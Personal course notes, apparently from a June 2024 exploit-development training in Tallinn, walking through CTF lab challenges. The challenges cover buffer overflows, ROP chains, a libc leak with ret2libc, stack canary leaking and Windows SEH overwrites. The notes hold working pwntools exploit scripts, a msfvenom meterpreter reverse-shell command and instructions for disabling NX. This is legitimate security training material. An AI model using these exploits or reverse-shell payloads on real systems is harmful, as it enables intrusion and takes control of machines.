---
description: EST, Tallin, 17.-21.6.2024
---

# Exploits Advanced (EXA)

* my VPN IP: 10.85.7.45
* Ubuntu machine: 10.140.121.24
* Kali machine: 10.140.122.24
* Win dev machine: 10.140.123.24

Webpages:

* CTFd platform: [https://exa-ctfd.tech.ccdcoe.org/](https://exa-ctfd.tech.ccdcoe.org/)
* Libc DB search: [https://exa-libc.tech.ccdcoe.org/](https://exa-libc.tech.ccdcoe.org/)

***

## DEBUGGING

* gdb ./program run (runs the programme)&#x20;
* start (runs + breaks at the main() func)&#x20;
* si (single instr ... instrukce po instrukci, vnorim se do loopu)&#x20;
* ni (next instr ... step over pres loop na dalsi funkci)&#x20;
* break or 'b' (pridam breakpoint)&#x20;
* hb (hardware breakpoint ... limited up to cca 16pcs)&#x20;
* delete (vymazu breakpoint)&#x20;
* disassemble (disass specific mem section)&#x20;
* x (examine mem)&#x20;
* continue or 'c'

Another cool stuff:

* msf-pattern\_create -l \<length>
* msf-pattern\_offset -q \<query>

***

## 01 RECAP BUFFER OVERFLOW&#x20;

### S1 - Get the offset to overwrite the EIP register

* Terminal - SSH to 10.140.121.24&#x20;
* VS Code - Green left-down - Connect to Host - student@10.140.121.24 template - exploit.py (we can try touch exploit.py in terminal after saving in VS Code if SSH remote instance works well...)&#x20;
* Terminal - 'tmux'&#x20;
  * 'gdb chal-elf\_01' -> gef -> pattern create 350&#x20;
    * \- saved as $\_gef0&#x20;

<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption><p>generating the pattern for offset recognition</p></figcaption></figure>

* run&#x20;
  * paste the generated pattern&#x20;
    * we reached the segmentation fault - now we can see which part of AAAAAAs arrived to instruction pointer (raac)&#x20;
  * pattern offset raac - it is value 268 (big-endian) - we dont actually need to count it manually, just call the address of eip&#x20;
    * pattern offset $eip&#x20;
      * **flag{268}**&#x20;
* modify exploit.py - 268:&#x20;
  * line 15: offset = b"A"\*268

### S2 - Find all the badchars

* "checksec buffer\_overflow"
* "ropper"
  * "file buffer\_overflow"
* bad buffer addresses
  * 0x00 also, dont forget it
* buffer = offset +
  * Im controlling saved BBBs +
* good func in gef called x (examinate)
  * gef - x/c $esp
    * I wanna see hexadecimal 0x1
    * weird is that after 0x09 and 0x0a should come 0x0b
      * but there is 0x00
        * b was incorrect guess
          * lets try close positioned (0x0a or 0x0c)
* we can see that address values change... because of
  * we need to find some cool address where to jump next...
* edit py script w bufs
* python3 exploit.py GDB
  * c
  * x/c $esp
* **\x00\x0a\x17\xcb**
  * ANSWER FOR 02
* define var
  * gadget = b"\x03\x85\x04\x08"
    * start from end (little endianess) ... 08 04 85 03
* python3 exploit.py GDB
  * b \*0x80405830
  * ni
  * inc ebx
* nop = b"\x90"
  * x90 is always for nop instruction...
  * we use it because it would destroy our obtained shell...
* buffer = offset + gadget + nop \*25 + buf
* on kali - MSFCONSOLE -Q
  * set payload linux/x86/meterpreter/reverse\_tcp
  * set LHOST IP
* after obtaining reverse shell from kali...
  * we can change exploit script from GDB to REMOTE
    * edit IP address from CTFd challenge and obtain connection...there is a flag.txt

WRITEUP

* checksec buffer\_overflow
  * we need to find gadget ESP
    * there is NO PIE (code segment is NOT randomized mem address, only stack pointers)
* pattern create 300
  * copy
* run
* c
* pattern offset $eip
* go to exploit
  * offset = b"A"\*268 (obtained eip address)
  * badbytes
    * 0x00 and 0x0a are often bad bytes
* ldd
  * addresses change
  * LSAP seems to be enabled
    * sudo cat /proc/sys/kernel/randomize\_va\_space
      * 0 means disabled, 1/2 means enabled (we have 2)
    * we can disable, but it then wont work on remote host

### S3: Obtain the address for the 'jmp esp' gadget

* ropper
  * file buffer\_overflow
    * help
    * search jmp esp
      * **0x08048503**

### S4: Execute the exploit to the remote target and find the content of flag.txt

* lets craft the obtained jmp esp address in little endianess (from back to front)
* edit exploit python
  * gadget = p32(0x08048503)
    * or: gadget = b"\x03\x85\x04\x08"
* Kali machine
  * msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=10.140.122.24 LPORT=4444 -f python -b "\x00\x0a\x17\xcb"
* Dev nachime
  * msfconsole -q
    * add settings (LHOST etc)
* REMOTE
  * add remote IP address (line 7)
* after obtaining reverse shell - ANSWER FOR 04 - flag.txt there



Theory x32 / x64

* double address size
* other address syntax (x64 rax, rbx...)
* another function call syntax
* x64 - 00 bytes are dangerous

## 02 - Arguments\_32

### S1:

* ./arguments\_32
  * If I write some string, it outputs the same string...
* checksec arguments\_32
  * Arch i386-32-little, Partial RELRO, NO Stack, NX enabled, NO PIE
* gdb arguments\_32
  * info functions
    * functions: flag, vuln, main...
  * b flag, b vuln, b main
  * c...
    * goes to vuln, then to main...not flag
    * we need to find a good offset and then to fill correct data to obtain flag
  * pattern create 350
    * copy it
  * run
    * paste it as an input for program
  * c
    * SIGSERV
    * $eip
      *
    * stops at 192
      * offset = b"A"\*192

### S2:

* after running with given offset, pointer gets BBBBs
  * breakpoints
    * b vuln
    * b main
    * b flag
      * copz flag address
        * 0x080485a6
          * flag = p32(0x080485a6)

### S3:

* flag function
  * disassemble flag()
  * we can see it compares some values...if exual it popsup flag, but it is not same value...
    * we must manage to get is equal
  * flag.txt read function
  * then it compares with value flag+144, if equal, I get the flag...
    * in the same folder, there is ho flag.txt file...it compares with 0 value
      * lets create file flag.txt
        * echo "Hello EXA" > flag.txt
  * 1st ARG: now Im in flag function...calling fopen with arg "r" (read)
    * NOT TAKEN - done well
  * 2nd ARG: compare function
    * x $ebp+0x8
    * this jmp is TAKEN - we run out of flag func...we must add condition to obtain equal cmp value...
      * modify exploit: buffer = offset + gadget + b"BBBB" + b"CCCC" + b"DDDD"
    * after running GDB - x $ebp+0x0
      * we have 43434343...CCCC which is correct, but we expected BBBB
      * lets add the EEEEs also
        * buffer = offset + gadget + b"BBBB" + b"CCCC" + b"DDDD" + b"EEEE"
    * instead of Cs, Ds and Es we make the correct addresses...
      * cmp func, there is je (flag+144) with 0x8048636 address
      * fgets ... call 0x8048430
      * cmp, there is jne (flag+192) with 0x8048666 address
  * 3rd ARG: fgets
  * these flag func has 3 ARGS and checks if they are:
    * 0xcbcbcbcb , 0x1ccdc0e1 and 0xdeadc0de

TUESDAY ROP and ret2libc

* Return Oriented Programming
* instead of placing executable code to stack we will navigate stack to our controlflow
* why was ROP created?
  * in OS executing some shell code in stack/memory is forbidden...
* NX = non-executable
* ret2libc
  * we dont need own shellcode...
  * available at all Linuxes
  *

## 03 - ROP-shell

* gdb rop-shell
  * info functions
    * in main: fopen, strncpy...then gmon start
  * pattern create
    * msf-pattern\_create -l 500
      * we add the generated string into exploit.py -> offset
        * offset =b"Aa0Aa1Aa2..."
    * afterwards $eip address in debugger...
      * 0xf7fa9830
        * x/c $eip
          * 0x89
            * offset is 412
  * base address of the .bss section of executable
    * objdump rop-shell -h | grep ".bss"
      * 0x0804a02c
  * search the writewhatwhere address gadget
    * we wanna run system interrupt (by default 0x80)
      * google: linux syscalls
        * x86 (32-bit)
          * 11 execve (eax has to be 0x0b)
  * ropper; file rop-shell
    * search mov
      * mov dword ptr \[ebp - 0xc], eax; cmp dword ptr \[ebp - 0xc], 0; je 0x597, ret;
      * we add it to code
        * 0x0804858c
        * write = p32(0x0804858c)
        * also an snwser for Step3 - Search the writewhatwhere address gadget
    * search pop eax
      * pop eax;ret;
      * we add it to code
        * 0x08048556
        * write = p32(0x08048556)
    * search add eax
      * add eax,0x1ab2;int 0x80;
      * 0x0804854e
        * answer for Step 4 - Which other gadget do zou need apart from pop eax ret...
    * search pop ebx
      * pop ebx;ret;
      * we add it to code
        * 0x080483a9
    * search pop ecx
      * pop ecx;ret;
      * we add it to code
        * 0x08048558
    * search xor
      * xor edx, edx;ret;
      * we add it to code
        * 0x0804855a
* REMOTE target attack
  * IP: 10.140.104.24, PORT: 9999
  *

***

ROP from Shellcode to Kernel

* betweel shellcode and kernel, there is a level that verifies if the program is permitted to access kernel...
  * there are INT (interrupt) codes, for example INT 80
  * we need to deliver correct ARGS, for example /bin/sh...
  * after correct args we obtain as answer from Kernel EAX and stuff...
* mov dword ptr \[eax], ebx ret

***

***

64-bit Function call

## 04 - Arguments\_64

* checksec arguments\_64
  * NX enabled
  * amd64-64-little
* ./arguments\_64
  * What program does: repeats the input
  * lets try AAAAAAAs
    * "command not found"
* gdb
  * create pattern 350
  * run
  * enter the pattern
  * in SIGSERVs at some vuln+0058
    * 64-bit architecture stops one step before end of programme, but at least shows the pre-last address
  * pattern offset $rsp
    * 200
  * info functions
    * flag, vuln, main
    * add them to breakpoints & run
      * main -> vuln -> exits
        * doesnt execute flag func..lets manipulate the programme to execute flag func
        * flag address: 0x0000000000400717
          * flag\_function = p64(0x400717)
            * now we can breakpoint into flag fulc
    * disassemble flag
  * now find the 3 arguments to call correctly to run the flag function
    * flag function
      * info functions => disassemble flag
        * <+71> movabs rax,0xcbcbcbcbcbcbcbcb
          * 0x40075e
        * <+87> movabs rax,0x1ccdc0e11ccdc0e1
          * 0x40076e
        * <+103> movabs rax,0xdeadc0dedeadc0de
          * 0x40077e => answer for Step3 ... arguments
      * $rdi
      * $rsi
      * $rdx => answer for Step4 ... register to pass the 3rd argument
    * NOT/TAKEN steps:
      * je 0x4007b8
      * jne 0x4007e1
    * to be able to modify it, it has to have file to write flag into...
      * nano flag.txt ... write sth there
* REMOTE
  * IP: 10.140.103.24, PORT: 9999
  * python3 exploit.py REMOTE
    * it prints out the flag in terminal...

***

```
- INFO:
	- in 64-bit we are to overwrite RETURN ADDRESS, not instruction pointer
		- 64-bit arch VERIFIES instruction pointer address before it jumps there
			- thats why only manipulating ISP value would be enough...
- now we are to modify 3 found flag args ($rdi $rsi $rdx)
- ropper
	- file arguments_64
	- search pop rdi
		- pop rdi;ret; 
		- 0x4008f3
	- search pop rsi
		- pop rsi;pop r15;ret;
		- 0x4008f1
		- Good, BUT we have also some r15 there...
- ropper -f arguments_64 | grep rdx
	- 0x4007b8 xchg rdx, rax; pop rax; ret;
	- lets figure out the pop rax also
- ropper
	- search pop rax
		- pop rax;ret;
		- 0x4007ba
- now we have everything
```

***

WEDNESDAY&#x20;

## 05 - Leak\_libc

* GOAL: leak the address of libc to bypass ASLR

### S1: Get the PW

* Open ghidra - initial analysis:
  * x86 processor, little endiann, executable,
  * Symbol tree - a lot of funcs
    * menu
      * few case options
        * none of them is interesting, maybe the case 2
          * two local vars, but we dont have control over them...
        * case 3
          * PW...reverse engineering to obtain it
          * void change\_pw(void)
            * lets find how to access this function
            * looks like XOR ...
              * if we find local\_10 and do XOR with local\_98 we should obtain PW
* gdb leak\_libc
  * set breakpoints to try to reach close to func
  * info functions
    * change\_pw
      * 0x400992
  * disassemble change\_pw
  * b change\_pw
  * run
    * we can see the string
      * RAX is 22...
        *   lets dcode it -> XOR over the string with 22

            * (cyberchef, dcode.fr...)

            <figure><img src=".gitbook/assets/image (7) (1).png" alt=""><figcaption><p>rax + string to process XOR</p></figcaption></figure>

            <figure><img src=".gitbook/assets/image (8) (1).png" alt=""><figcaption><p>Step1 Answer</p></figcaption></figure>
* Theory
  * ASLR
    * Address Space Layout Randommization
    * how to bypass - 3 ways
      * brute force
      * partial overwrite
      * mem leak
        * leak some func addr -> subtract the offset to the base of the lib -> add the offset of any func in that lib...

### S2: Get the offset to overwrite

* modify the exploit code a little...
* use gdb gef to generate a pattern
  * pattern create 350
  * pattern offset $rsp
    * **72**
      * answer for Step2

```python
from pwn import *
#from sol import OFFSET

context(terminal=['tmux', 'splitw', '-h'])
context.log_level = 'debug'

# BIN INFO (checksec)
    # Arch: amd64-64-little
    # RELRO: Partial RELRO
    # Stack: No canary found
    # NX: NX enabled
    # PIE: No PIE (0x400000)

if args.REMOTE:
    io = remote("10.140.121.XX", 9999)
else:
    io = context.binary = ELF('leak_libc')
    if args.GDB:
        io = gdb.debug(io.path)
    else:
        io = process(io.path)

io.sendline(b"3")
io.recvuntil("Please enter old password: ")
io.sendline("EXACourse")

rop = b""
rop += b"A"*72

io.sendline(rop)
io.interactive()
```



### S3: Address of PUTS@PLT&#x20;

### S4: Address of PUTS@GOT

* we need actually more args...to add via rop
  * puts\_plt = p64() # address&#x20;
  * puts\_got = p64() # argument&#x20;
  * pop\_rdi = p64() # instruction
*   puts\_plt

    * gdb leak\_libc -> info functions
      * **0x4006e0** puts@plt

    <figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
* puts\_got
  *
* pop\_rdi
  * ropper -> file leak\_libc -> search pop rdi
    * 0x400c93: pop rdi;ret;

```python
from pwn import *
#from sol import OFFSET

context(terminal=['tmux', 'splitw', '-h'])
context.log_level = 'debug'

# BIN INFO (checksec)
    # Arch: amd64-64-little
    # RELRO: Partial RELRO
    # Stack: No canary found
    # NX: NX enabled
    # PIE: No PIE (0x400000)

if args.REMOTE:
    io = remote("10.140.121.XX", 9999)
else:
    io = context.binary = ELF('leak_libc')
    if args.GDB:
        io = gdb.debug(io.path)
    else:
        io = process(io.path)

io.sendline(b"3")
io.recvuntil("Please enter old password: ")
io.sendline("EXACourse")

puts_plt = p64(0x4006e0)    # address
puts_got = p64(0x602028)    # argument
pop_rdi = p64(0x400c93)     # instruction

rop = b""
rop += b"A"*72
rop += pop_rdi      # instruction
rop += puts_got      # argument
rop += puts_plt      # address

io.sendline(rop)
io.interactive()
```

### S5: Get the libc offset for the symbol '/bin/sh' of the remote (IP: 10.140.105.X - Port: 9999) libc library with respect puts

* first part - obtaining putts\_address

```python
from pwn import *
#from sol import OFFSET

context(terminal=['tmux', 'splitw', '-h'])
context.log_level = 'debug'

# BIN INFO (checksec)
    # Arch: amd64-64-little
    # RELRO: Partial RELRO
    # Stack: No canary found
    # NX: NX enabled
    # PIE: No PIE (0x400000)

if args.REMOTE:
    io = remote("10.140.121.XX", 9999)
else:
    io = context.binary = ELF('leak_libc')
    if args.GDB:
        io = gdb.debug(io.path)
    else:
        io = process(io.path)

io.sendline(b"3")
io.recvuntil("Please enter old password: ")
io.sendline("EXACourse")

puts_plt = p64(0x4006e0)    # address
puts_got = p64(0x602028)    # argument
pop_rdi = p64(0x400c93)     # instruction: pop rdi;ret;

rop = b""
rop += b"A"*72
rop += pop_rdi      # instruction
rop += puts_got      # argument
rop += puts_plt      # address

io.sendline(rop)
io.recvline()
io.recvuntil("Please enter new password: ")
io.recvline()
io.recvline()

received = io.recvline()[:-1]
# Convert to little endian
puts_addr = int.from_bytes(received, "little")
info(f"Puts_addr @ libc: {hex(puts_addr)}")
'''
Obtained as GDB output
0x7f285d873e50
'''

#io.sendline(rop)
io.interactive()
```

* Obtained puts\_addr:
  * ```
    0x7f285d873e50
    ```
  * according to the libc DB search ([https://exa-libc.tech.ccdcoe.org/](https://exa-libc.tech.ccdcoe.org/))
    * I searched for puts with offset ending "e50"
      * from Matches I used ubuntu3.8...because:
        * ldd leak\_libc

<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

* it means => for second part (crafting loop to obtain REMOTE address - ...e50 is only LCOAL one) we need to move to system (== /bin/sh) -> we are to modify code with Difference -0x300e0 for system w connection to puts we got...

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

* second part - crafting loop\_function&#x20;
  * loop\_func = p64() && rop1 += loop\_func
  * we need to find out the loop\_address, which is 1st in stack of change\_pw func...
    * gdb leak\_libc
      * disassemble change-pw
        * 0x400992 push rbp

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

```python
from pwn import *
#from sol import OFFSET

context(terminal=['tmux', 'splitw', '-h'])
context.log_level = 'debug'

# BIN INFO (checksec)
    # Arch: amd64-64-little
    # RELRO: Partial RELRO
    # Stack: No canary found
    # NX: NX enabled
    # PIE: No PIE (0x400000)

if args.REMOTE:
    io = remote("10.140.121.XX", 9999)
else:
    io = context.binary = ELF('leak_libc')
    if args.GDB:
        io = gdb.debug(io.path)
    else:
        io = process(io.path)

io.sendline(b"3")
io.recvuntil("Please enter old password: ")
io.sendline("EXACourse")

puts_plt = p64(0x4006e0)    # address
puts_got = p64(0x602028)    # argument
pop_rdi = p64(0x400c93)     # instruction: pop rdi;ret;
loop_func = p64(0x400992)   # instruction: push rbp (obtained from disasembled change_pw in gdb)

offset = 72

rop1 = b""
rop1 += b"A" * offset
rop1 += pop_rdi      # instruction
rop1 += puts_got      # argument
rop1 += puts_plt      # address
rop1 += loop_func
io.sendline(rop1)

io.recvline()
io.recvuntil("Please enter new password: ")
io.recvline()
io.recvline()

received = io.recvline()[:-1]

# Convert to little endian
puts_addr = int.from_bytes(received, "little")
info(f"Puts_addr @ libc: {hex(puts_addr)}")
'''
Obtained as GDB output
0x7f22f743c980
'''
# Get
#system_offset = -0x300e0 # Local
system_offset = -0x2b4f0 # Remote
system_addr = puts_addr + system_offset

#str_bin_sh_offset = 0x157828 # Local
str_bin_sh_offset = 0x11e6b1 # Remote
str_bin_sh_addr = puts_addr + str_bin_sh_offset

rop2 = b""
rop2 += b"A" * offset
rop2 += pop_rdi
rop2 += p64(str_bin_sh_addr)
io.sendline(rop2)

io.interactive()

# puts_addr 0x7f22f743c980
```

*   **OK we obtained important stuff for answering S5 and S6...**



    * after obtaining puts\_addr with changed local addresses after offseting e50...
      * 0x7f9b68f50980

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

* puts 980 -> str\_bin\_sh
  * **0x11e6b1**

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

### S6: remote system address

* puts 980 -> system
  * **0x2b4f0**

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### **S7: remote connection**

* OK, to sum up:
  * now we have the libc offset for the symbol /bin/sh and system -> ASLR bypass done
* add remote IP and PORT:&#x20;

## 06 - Leak\_Canary

Canary is easily said additional security layer in stack (above Stack EBP and below DATA)

Programme checks if the canary changed or not...

### S1: Offset

1. Lucky manually obtained

* Ghidra - function that displays \[**88**]

2. Breakpoint

* pattern create 300
* b 0x400797
  * breakpoint at xor rax, QWORD...ending of Canary
* run
* c
* c
* pattern offset $rax
  * **88**

### S2: Where is the canary?

* gdb leak\_canary
  * info functions
    * disassemble vuln
      * SETTING UP THE CANARY
        * \+8 and +11 (mov DWORD PTR... and mov rax, QWORD PTR...)
      * VERIFYING IF CANARY IS GOOD VALUE
        * \+160 and +164 (mov rax, QWORD... and xor rax, QWORD...)
      * \+ we can see between, that it does printf@plt&#x20;
        * in documentation of Canary...
          * we can bruteforce Canary by:
            * %X$p

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

* Loop for trying to bruteforce the canary

```python
from pwn import *

context(terminal=['tmux', 'splitw', '-h'])
context.log_level = 'debug'

if args.REMOTE:
    io = remote("10.140.121.XX", 9999)
else:
    io = context.binary = ELF('leak_canary')
    if args.GDB:
        io = gdb.debug(io.path)
    else:
        io = process(io.path)

for i in range(1,30):
    io.recvuntil(f"This is try nr {i} \n")
    io.sendline(f"%{i}$p")

#io.sendline(buffer)
io.interactive()
```

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

* Lets verify it by running the exploit...
  * NO 19 looks interesting...looks like our canary
    * 0x70ee2035cc3dfd00
    * Answer for S2: **%19$p**

<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

### S3: Address of PUTS@PLT

* gdb leak\_libc
  * info functions
    * second one...
      * **0x4005b0**

<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

* second option
  * gdb leak\_libc
    * start
    * disas main
      * there it is also...

### S4: Address of PUTS@GOT

* PUTS@GOT is just a pointer to PUTS@PLT...
  * and PUTS@PLT is also a pointer to somewhere...
  * which means PUTS@GOT is a pointer to pointer...
*   we have 2 possibilities how to obtain that:



1.  Breakpoint to a pointer of puts@plt



* gdb leak\_canary
  * disas main
  * b \*0x4007bc
  * c
    * now we are in puts@plt

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

* si
  * we obtained puts@got.plt....
    * 0x601018

<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

2. got command

* gdb leak\_canary
  * start
  * disas main
    * got
    * here we go, easy as it is...
      * 0x601018

<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

* Additional step:
  * find also pop\_rdi address, we will need it
    * ropper -> file leak\_canary -> search pop rdi
      * 0x400853
        *

            <figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

After obtaining S4, here is how the exploit looks like now:

```python
from pwn import *

context(terminal=['tmux', 'splitw', '-h'])
context.log_level = 'debug'

if args.REMOTE:
    io = remote("10.140.121.XX", 9999)
else:
    io = context.binary = ELF('leak_canary')
    if args.GDB:
        io = gdb.debug(io.path)
    else:
        io = process(io.path)

'''
Loop for obtaining Canary by brute-forcing:
for i in range(1,30):
    io.recvuntil(f"This is try nr {i} \n")
    io.sendline(f"%{i}$p")
'''    
'''
Obtained Canary address:
0x70ee2035cc3dfd00
'''
#Ziskani aktualniho Canary (dynamicky se alokuje) + jeho vypis
io.recvuntil("This is try nr 1 \n")
io.sendline(b"%19$p")
canary = io.recvline()[:-1]
info(f"Canary: {canary}")

junk = b"A" * 88
rbp_junk = b"B" * 8

# Addresses
puts_plt = p64(0x4005b0)
puts_got = p64(0x601018)    
pop_rdi = p64(0x400853)     # pop rdi;ret;

rop = b""
rop += pop_rdi
rop += puts_got
rop += puts_plt

buffer = junk + p64(int(canary, base=16)) + rbp_junk + rop

io.sendline(buffer)

# Processing the leaked puts address
io.recvline()
received = io.recvline()[-7:-1]
puts_leaked = int.from_bytes(received, "little")
info(f"PUTS @ GOT: {hex(puts_leaked)}")

## Ret2libc

# Compute system and /bin/sh address


io.interactive()


```

### S5: libc offset for the func 'system' of the local libc lib

* actually same as for the previous challenge (05 Leak Libc)
  * because puts ands with offset e50 also...
    * [https://libc.rip/](https://libc.rip/)

<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

* system local Difference:
  * \-0x300e0

### S6: libc library version that is being used on the remote target

* Last one from the list...after obtaining offset change from e50 to 980 with rop1

<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

* **libc6\_2.36-9+deb12u7\_amd64**

### **S7:** Execute the exploit to the remote target and find the content of flag.txt



## 07 - SEH&#x20;

**xDBG Theory**

* mostly we will use:
  * CPU, Log, Breakpoints, Mem, **SEH...**

**Network scheme:**

* PC -> SSH to Ubuntu dev machine for VScode
* PC -> Reminna RDP to WIN machine for x32dbg

### S1: Offset until SEH Handler-addr is overwritten

* first what arch is this file...
  * PE32, lets use x32dbg

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

```python
from pwn import *

context.log_level = 'debug'
io = remote("10.140.123.24", 80)

# try some offset...
offset = b"A"*1000

buffer = offset

io.sendline(buffer)
io.interactive()

# NX Disable/Enable (in WIN PS w admin rights):
#   - Disable: 'bcdedit.exe /set nx AlwaysOff'
#   - Enable: 'bcdedit.exe /set nx AlwaysOn'
```

* Run the .exe w double/clink in Windows
* Open the file in x32dbg
* Run the script in SSH Ubuntu dev...



* Go to x32dbg -> 1x Continue -> in CPU registers EIP -> right-click COPY VALUE (17071ADF)
* terminal: msf-pattern\_offset -q 0x17071ADF
  * **676**

### S2: PopPopRet (PPR) gadget address

* IDK how to find it in x32dbg, searching doesnt work as expected
* Ropper
  * file EXA-SEH.exe
    * search pop
      * we are looking for pop pop ret
        * **0x17071688**

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

```python
from pwn import *

context.log_level = 'debug'
io = remote("10.140.123.24", 80)


offset = b"A"*676               # offset from S1
offset += p32(0x17071688)       # first pop-pop-ret

buffer = offset

io.sendline(buffer)
io.interactive()


# NX Disable/Enable (in WIN PS w admin rights):
#   - Disable: 'bcdedit.exe /set nx AlwaysOff'
#   - Enable: 'bcdedit.exe /set nx AlwaysOn'
# offset +=

```

### S3: Exact MEM size in bytes, available right after the PopPopRet gadget to include a possible reverse shell code



### S4:

### S5:

### S6:
